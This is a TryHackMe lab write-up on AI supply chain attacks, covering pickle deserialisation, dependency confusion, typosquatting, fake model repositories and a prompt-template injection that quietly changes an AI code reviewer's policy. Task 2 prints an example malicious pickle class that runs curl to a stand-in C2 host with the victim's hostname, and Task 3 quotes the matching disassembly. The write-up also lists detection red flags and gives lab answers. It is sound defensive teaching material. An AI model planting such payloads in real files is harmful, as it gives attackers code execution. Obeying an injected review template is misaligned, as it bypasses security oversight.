# AI Supply Chain Attack Vectors

**Room:** [Securing the AI Supply Chain – Attack Vectors](https://tryhackme.com/jr/understanding-ai-supplychains)  
**Module:** AI Supply Chain Security  
**Difficulty:** Intermediate  
**Status:** ✅ Completed

---

## Overview

> *"Yesterday, the CEO at TryTrainMe received an alarming email: your systems have been compromised through your AI-powered code reviewer. Check those .pkl files you downloaded."*

This room puts you in the role of a security analyst responding to a real incident. A company called **TryTrainMe** had its AI-powered code reviewer compromised through multiple overlapping supply chain attacks — a malicious pickle model, a dependency confusion package, and a fake model repository, all deployed simultaneously.

Over 9 tasks, you investigate how attackers exploit every layer of the AI supply chain: from model files and Python packages, to repositories and API providers.

---

## Learning Objectives

- Explain how Python's pickle serialisation enables arbitrary code execution via `__reduce__`
- Investigate malicious model files safely using `pickletools`
- Describe how dependency confusion and typosquatting compromise package installs
- Identify warning signs of a compromised model repository
- Recognise API-specific attack vectors: silent updates, key compromise, and prompt template injection

---

## Key Terms & Concepts

| Term | What It Means |
|------|--------------|
| **Serialisation** | Converting a Python object (e.g. a model) into a file on disk |
| **Deserialisation** | Reversing that — loading the file back into memory |
| **Pickle** | Python's built-in serialisation format; used by PyTorch, scikit-learn, etc. |
| **`__reduce__`** | A special Python method pickle calls to get instructions for reconstructing an object — the one attackers abuse |
| **`STACK_GLOBAL`** | A pickle opcode that resolves and calls a Python function |
| **`REDUCE`** | A pickle opcode that executes a function with provided arguments |
| **pickletools** | Python's built-in module for *safely* disassembling pickle files without running them |
| **SafeTensors** | A safer alternative model format that strips all executable code and removes pickle payloads |
| **Lambda Layer** | A Keras feature that adds custom Python logic into a model's architecture — can be abused to embed hidden behaviour |
| **GGUF** | A file format for locally-run LLMs (e.g. LLaMA, Mistral); no pickle, but can carry backdoored weights |
| **Dependency Confusion** | Tricking pip into installing a public attacker package instead of a private internal one, by using the same name with a higher version |
| **Typosquatting** | Registering a package or model name that is a slight misspelling of a real one |
| **Namespace Squatting** | Creating a fake organisation name on Hugging Face that looks like a real one |
| **C2 (Command & Control)** | The attacker's server that receives beacons or commands from compromised systems |
| **Silent Model Update** | When an API provider silently replaces the model behind an endpoint with no notice |
| **Prompt Template Injection** | Injecting malicious instructions via a compromised system prompt template pulled from an external source |
| **Training Data Poisoning** | Corrupting a model's behaviour by manipulating the data it was trained on |

---

## Task-by-Task Breakdown

---

### Task 1 – Introduction: The TryTrainMe Incident

**What happened?**  
TryTrainMe's CEO received a threatening email from a "security researcher" claiming their AI code reviewer had been compromised for three weeks. The investigation that follows uncovers four simultaneous attack vectors.

**Why it matters:**  
Supply chain attacks are especially dangerous in AI/ML because developers routinely download model files from public repositories and install packages from public indexes — often without verifying the source. A single download can give an attacker full system access.

**Real-world parallel:**  
The JFrog research team discovered approximately 100 malicious models on Hugging Face — not edge cases, but active campaigns. The SolarWinds attack (2020) used the same multi-vector, trust-the-source approach.

---

### Task 2 – Malicious Model Serialisation (Pickle)

**Introduction:**  
Most ML models are saved using Python's pickle format (`.pkl`, `.pt`). It's convenient, but it's also dangerous — pickle can embed and execute arbitrary code when a file is loaded.

**How it works:**

1. When pickle saves a custom Python object, it calls `__reduce__` to get "reconstruction instructions."
2. Those instructions can tell Python to call **any function** with **any arguments**.
3. Pickle follows those instructions automatically when you call `pickle.load()` — with no warning.

```python
class MaliciousModel:
    def __reduce__(self):
        return (os.system, ("curl http://c2.example.com/beacon?host=$(hostname)",))
```

When a developer calls `torch.load('code_reviewer.pkl')`, Python silently calls `os.system()` and phones home to the attacker's server.

**What attackers can do with this:**

| Payload | Impact |
|---------|--------|
| Reverse shell | Full remote access to the victim's machine |
| Data exfiltration | Steals credentials, source code, config files |
| Crypto miner | Uses the victim's compute to mine cryptocurrency |
| Reconnaissance | Maps usernames, hostnames, running processes |

**Safe inspection with pickletools:**

```bash
# SAFE: disassembles without executing
python3 -m pickletools suspicious_model.pkl | head -30
```

**Red flags to look for:**

| Pattern | Concern Level |
|---------|--------------|
| `os`, `subprocess`, `socket` | 🔴 Critical |
| `system`, `popen`, `eval`, `exec` | 🔴 Critical |
| `curl`, `wget` in strings | 🔴 Critical |
| `STACK_GLOBAL` + `os.system` | 🔴 Critical |
| `REDUCE` in suspicious context | 🟡 Moderate |

**Beyond pickle — Keras Lambda Layers:**  
Pickle attacks fire when the model **loads**. A second category hides malicious logic inside the model's **architecture** — specifically in Keras Lambda layers. These fire at **inference time** (every prediction) and survive conversion to SafeTensors because they're baked into the architecture itself, not the file wrapper.

| Factor | Pickle `__reduce__` | Keras Lambda Layer |
|--------|--------------------|--------------------|
| Executes when | Model is loaded | Model makes a prediction |
| Survives SafeTensors | ❌ No | ✅ Yes |
| Severity | CRITICAL | MEDIUM |

**GGUF note:**  
GGUF (used by LLaMA, Mistral, Qwen) doesn't use pickle, so loading one won't execute code. However, an attacker can fine-tune a model to bake backdoor behaviour into the weights before converting — invisible to any static scanner.

**Defence:**
- **Never** use `pickle.load()` on untrusted files
- Use `pickletools` to inspect before loading
- Prefer **SafeTensors** format where possible
- For GGUF: verify source, check checksums, prefer files from verified publishers

---

### Task 3 – Lab: Investigating the Malicious Model

**What you did:**  
Used the lab VM to investigate `code_reviewer.pkl` vs `code_reviewer_v1.pkl` (the clean baseline).

**Key findings from pickletools:**

```
11: SHORT_BINUNICODE 'os'
16: SHORT_BINUNICODE 'system'
25: STACK_GLOBAL
27: 'curl http://[REDACTED]/beacon?host=$(hostname)'
80: REDUCE
```

The suspicious model contained `os.system` calling `curl` to beacon out to an external domain. The clean model contained only standard class reconstruction and model weights — no OS calls, no external URLs.

**The attack flow:**

| Step | Action | Actor |
|------|--------|-------|
| 1 | Created malicious model with `__reduce__` calling `os.system` | Attacker |
| 2 | Uploaded to Hugging Face as `trustworthy-ai-lab/code-review-bert-v2` | Attacker |
| 3 | ML engineer searched for a code review model | ML Engineer |
| 4 | Downloaded based on the professional-looking model card | ML Engineer |
| 5 | Called `torch.load('code_reviewer.pkl')` | ML Engineer |
| 6 | Payload executed — C2 beacon fired silently | Automatic |
| 7 | Attacker received beacon and established persistent access | Attacker |

**Lab answers:**

| Question | Answer |
|----------|--------|
| Module that safely disassembles pickle | `pickletools` |
| External domain contacted | `[REDACTED — check lab output]` |
| Pickle opcode that executes the function | `REDUCE` |

---

### Task 4 – Dependency Confusion & Typosquatting

**Introduction:**  
The model file is not the only attack surface. The Python packages your project depends on are equally dangerous.

**How pip resolves packages:**  
When you run `pip install package-name`, pip queries all configured indexes and installs the **highest version** it finds across all of them. If your organisation uses a private package registry for internal packages, pip checks both the private index and public PyPI.

**Dependency confusion attack:**  
If your internal package name (e.g. `internal-ml-utils`) isn't registered on public PyPI, an attacker can:
1. Register `internal-ml-utils` on public PyPI
2. Set the version to `99.0.0` — higher than your internal version
3. pip installs the attacker's public package automatically, silently

> Alex Birsan demonstrated this in 2021 against Apple, Microsoft, and PayPal — earning over $130,000 in bug bounties.

**Typosquatting:**  
Registering package names that are slight misspellings of popular ones:

| Legitimate | Typosquatted | Difference |
|-----------|-------------|------------|
| `numpy` | `numppy` | Extra 'p' |
| `requests` | `reqeusts` | Swapped 'ue' |
| `scikit-learn` | `scikitlearn` | Missing hyphen |
| `tensorflow` | `tenserflow` | 'ser' instead of 'sor' |

In the TryTrainMe lab, `requirements_external.txt` contained:
- `numppy==1.24.0` — typosquatted numpy
- `reqeusts==2.31.0` — typosquatted requests
- `internal-ml-utils==99.0.0` — dependency confusion

**Defence:**
- Audit all `requirements.txt` files before installing
- Use `pip-audit` to scan for known-vulnerable and suspicious packages
- Pin internal packages to exact versions with `--index-url` (private only)
- Register internal package names on public PyPI defensively (as empty/stub packages)
- Compare package names character-by-character against known-good lists

**Real-world example:**  
In January 2023, Fortinet found three typosquatted PyPI packages (`colorslib`, `httpslib`, `libhttps`) that downloaded and executed information-stealing malware.

**Lab answer:**

| Question | Answer |
|----------|--------|
| Term for public package overriding internal package | `dependency confusion` |

---

### Task 5 – Model Repository Manipulation

**Introduction:**  
Even if a model file passes a safety scan, the repository it comes from can be weaponised. Hugging Face hosts over one million models and is the primary target for repository-based attacks.

**How Hugging Face trust signals work:**  
Developers rely on reputation signals: download counts, organisation verification badges, model card quality, and upload dates. Attackers exploit every one of these signals.

**Namespace & typosquatting on model names:**

| Legitimate | Attacker's Version | Trick |
|-----------|-------------------|-------|
| `bert-base-uncased` | `bert-base-uncased-v2` | Added `-v2` |
| `meta-llama/Llama-2-7b` | `meta-Ilama/Llama-2-7b` | Capital 'I' instead of 'l' |
| `openai/whisper-large` | `openai-releases/whisper-large` | Added `-releases` |

**Fake organisation names:**

| Real | Fake |
|------|------|
| `google` | `google-research-models` |
| `meta-llama` | `meta-llama-community` |
| *(none)* | `trustworthy-ai-lab` |

The `trustworthy-ai-lab` in TryTrainMe's scenario sounds credible — but has no verification badge, no history, and near-zero downloads.

**Compromising legitimate repositories:**  
Typosquatting targets users who download the wrong model. A more dangerous variant compromises a repository developers already trust. Lasso Security research (November 2023) found **1,500+ Hugging Face API tokens** exposed in public code repositories — 655 with **write permissions** to organisations including Google, Meta, and Microsoft.

An attacker with a write-permission token can push a malicious model update under a trusted identity — no fake account needed.

**Warning signs checklist:**

| Indicator | Safe | Suspicious |
|-----------|------|-----------|
| Download count | Thousands+ | Under 500 |
| Organisation | Verified badge, known name | No badge, generic name |
| Model card | Detailed — architecture, training, metrics | Missing or sparse |
| Upload date | Consistent with claimed timeline | Very recent for an "established" model |
| File formats | SafeTensors available | Pickle only |
| Dependencies | Standard, known packages | Unusual or private packages |

**Lab answer:**

| Question | Answer |
|----------|--------|
| Technique for model names resembling legitimate ones | `typosquatting` |

---

### Task 6 – Combining Attack Vectors: The Full TryTrainMe Timeline

**Introduction:**  
Malicious serialisation, dependency confusion, and repository manipulation rarely appear alone. In the TryTrainMe case, all three were deployed simultaneously for redundancy.

**The full timeline:**

| Week | Event |
|------|-------|
| Week 1 | Attacker registers `trustworthy-ai-lab` on Hugging Face, uploads backdoored model. Simultaneously publishes `internal-ml-utils==99.0.0` to PyPI. |
| Week 2 | TryTrainMe engineer downloads and loads the model. Pickle payload fires silently — C2 beacon connects. |
| Week 3 | Routine `pip install -r requirements.txt` pulls the attacker's PyPI package. Second foothold established independently. |
| Detection | SOC alert flags repeated outbound HTTPS to an unrecognised domain. CEO receives the email. |

**Why multiple vectors?**

| Vector | Mechanism | Purpose |
|--------|-----------|---------|
| Pickle payload | `__reduce__` calling `os.system` | Primary entry: fires on model load |
| Dependency confusion | `internal-ml-utils==99.0.0` on PyPI | Backup entry: fires on `pip install` |
| Repository manipulation | Fake `trustworthy-ai-lab` org | Social engineering: makes download feel safe |

If one vector is blocked, another is already in place.

**Key lesson:**  
Supply chain attacks offer attackers multiple independent paths to code execution. Defending against one vector is not enough — you need layered defences across every attack surface.

**Lab answers:**

| Question | Answer |
|----------|--------|
| Which vector did the fake org represent? | `repository manipulation` |
| Which second vector would still work if pickle was blocked? | `dependency confusion` |

---

### Task 7 – API Provider Compromise

**Introduction:**  
The previous tasks covered attacks against files you download and run yourself. But many organisations consume AI through hosted APIs. You can't run `pickletools` on a JSON response. A different set of attack vectors applies.

**Silent Model Updates:**
- **What it is:** The provider replaces the model behind an API endpoint without notice. Same URL, different behaviour.
- **TryTrainMe risk:** A silent update to their code review API could approve vulnerable code without triggering any alert.
- **Defence:** Version-pin API calls where supported. Log model version identifiers from every response. Baseline model behaviour and alert on output drift.

**API Key Compromise:**
- **What it is:** Your API key leaks (via source code, CI/CD logs, `.env` files). Attacker makes calls on your behalf, exfiltrates your data, or runs up your bill.
- **TryTrainMe risk:** API key stored in an unencrypted CI/CD environment variable — exposed with every log.
- **Defence:** Store keys in a secrets manager. Never commit to source code. Set spending alerts and rate limits. Rotate immediately on any suspected exposure.

**Prompt Template Injection:**
- **What it is:** System prompts sourced from shared template libraries are supply chain artefacts. A compromised template repository can alter application behaviour across every app that imports from it.
- **TryTrainMe risk:** Code review prompt pulled from a community template library and never reviewed again. A malicious update could instruct the agent to approve all PRs unconditionally.
- **Defence:** Treat system prompts as code. Version-control them in your own repo. Never auto-update prompts from external sources without review.

**Upstream Training Data Poisoning:**
- **What it is:** The API provider's model was trained on data that included adversarially crafted examples. The model produces systematically biased or unsafe outputs — invisible to the consumer.
- **TryTrainMe risk:** Model fine-tuned on adversarial security advisories; it consistently underestimates SQL injection severity. Nothing in TryTrainMe's logs reveals this.
- **Defence:** No file to scan. Mitigations are operational: red-team outputs regularly, maintain human review for high-stakes decisions, treat model behaviour as a managed risk.

**Lab answers:**

| Question | Answer |
|----------|--------|
| Term for model replaced behind an endpoint without notice | `silent model update` |
| Supply chain artefact that can alter LLM behaviour across apps | `prompt template` |

---

### Task 8 – Lab: TryAssist Prompt Template Injection

**What you did:**  
Tested TryAssist (TryTrainMe's AI code reviewer) after a routine template library update, using 4 structured prompts to detect behaviour changes.

**What the prompts revealed:**

| Prompt | What It Tested | Expected | Actual |
|--------|---------------|----------|--------|
| 1 – README PR | Baseline behaviour | Approve (low risk) | Approved ✅ |
| 2 – Auth token PR | Security guardrail | Escalate / flag for human review | Did not escalate ⚠️ |
| 3 – Security review process | What steps does it follow? | Should name a security escalation process | Named no such process |
| 4 – Template source | What policy is it following? | Should name a controlled, versioned policy | Named an external community template |

**What happened:**  
The template library update silently replaced TryAssist's review policy. The model itself didn't change. No dependency version was bumped. A text string — served remotely and trusted implicitly — rewrote the agent's behaviour.

**Key insight:**  
The supply chain artefact here was not a model file. It was a **prompt template**.

**Lab answers:**

| Question | Answer |
|----------|--------|
| Who does TryAssist say is responsible for security reviews? | `[REDACTED — check agent output]` |
| Name of the review template TryAssist reports | `[REDACTED — check agent output]` |

---

### Task 9 – Summary: Attack Vector Landscape

**Complete attack vector table:**

| Vector | Mechanism | Detection Difficulty | Impact |
|--------|-----------|---------------------|--------|
| Pickle `__reduce__` | Embeds code in model files | Moderate — `pickletools` can reveal | Code execution on model load |
| Keras Lambda / custom layers | Embeds code in model architecture | Moderate — architecture inspection | Code execution at inference time |
| Dependency confusion | Hijacks internal package names via higher version | Low — version anomalies visible | Code execution on `pip install` |
| Typosquatting | Misspelt package/model names | Low — name comparison reveals | Code execution on install |
| Repository manipulation | Fake orgs, professional model cards | Moderate — reputation signals | Trusted distribution of malicious models |
| API provider compromise | Silent updates, key exposure, prompt tampering | High — no file artefact | Invisible model substitution or data exfiltration |
| GGUF weight-level | Backdoor baked into weights before quantisation | High — no static analysis tools available | Triggered misclassification or output manipulation |

**The attacker's strategy:**  
Attackers don't pick one technique and hope it lands. They stack vectors across every layer — model file, dependencies, repository signals, and the API supply chain — so that if one is blocked, another is already in place.

---

## Key Lessons

1. **Never call `pickle.load()` on an untrusted file.** Use `pickletools` to disassemble and inspect first.
2. **SafeTensors is not a universal fix.** It removes pickle payloads but leaves architecture-level attacks (Keras Lambda layers) completely intact.
3. **Dependency confusion exploits pip's version-first logic.** A version `99.0.0` on public PyPI beats your internal `1.0.0` every time.
4. **A professional-looking model card is not a trust signal.** Verify badges, download counts, upload dates, and file formats before downloading.
5. **API consumers have no file to scan.** Defences shift to output monitoring, key management, and treating prompts as code under version control.
6. **Supply chain attacks are layered by design.** Redundant vectors ensure that blocking one still leaves the attacker a path in.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `pickletools` | Safe pickle file disassembly (no code execution) |
| `safe_analysis.py` | Lab helper script for structured pickle analysis |
| `pip-audit` | Scans requirements files for known vulnerabilities |
| `file` command | Basic file type check (insufficient alone for pickle) |

---

## Frameworks Referenced

| Framework | Relevance |
|-----------|-----------|
| MITRE ATLAS | AI-specific adversarial techniques (maps to supply chain attacks) |
| OWASP LLM Top 10 | LLM-specific risks including supply chain and prompt injection |
| MITRE ATT&CK | Broader TTPs that underpin many of these attack patterns |

---

*Write-up by Santosh | TryHackMe: santy.adhi87 | GitHub: Santyadhi87*  
*Part of the AI Security learning path — public portfolio: [AI-Security](https://github.com/Santyadhi87/AI-Security)*
